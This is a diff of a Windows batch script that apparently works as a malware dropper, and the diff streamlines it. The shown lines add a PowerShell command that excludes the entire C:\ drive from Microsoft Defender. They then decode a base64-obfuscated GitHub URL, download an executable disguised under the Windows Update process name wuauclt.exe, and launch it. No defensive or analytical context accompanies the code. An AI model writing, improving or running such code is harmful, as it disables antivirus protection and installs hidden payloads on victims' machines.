@@ -37,16 +37,10 @@ if %errorLevel% == 0 (
     )
     
     setlocal
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
     set "exeFile=%TEMP%\wuauclt.exe"
     set "url1=aHR0cHM6Ly9naXRodWIuY29tL3ZhdWx0MDUzMDA5LW1ha2VyL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9WaW9sZXRDbGllbnQuZXhl"
-    set "ps1=%TEMP%\update.ps1"
-    echo [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')) ^| Out-File -FilePath '%TEMP%\url.txt' -Encoding ASCII > "%ps1%"
-    echo $url = Get-Content '%TEMP%\url.txt' >> "%ps1%"
-    echo (New-Object Net.WebClient).DownloadFile($url, '%exeFile%') >> "%ps1%"
-    echo Add-MpPreference -ExclusionPath 'C:\' >> "%ps1%"
-    powershell -NoProfile -ExecutionPolicy Bypass -File "%ps1%"
-    del "%ps1%"
-    del "%TEMP%\url.txt"
+    powershell -Command "$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
     start "" "%exeFile%"
     endlocal
     exit
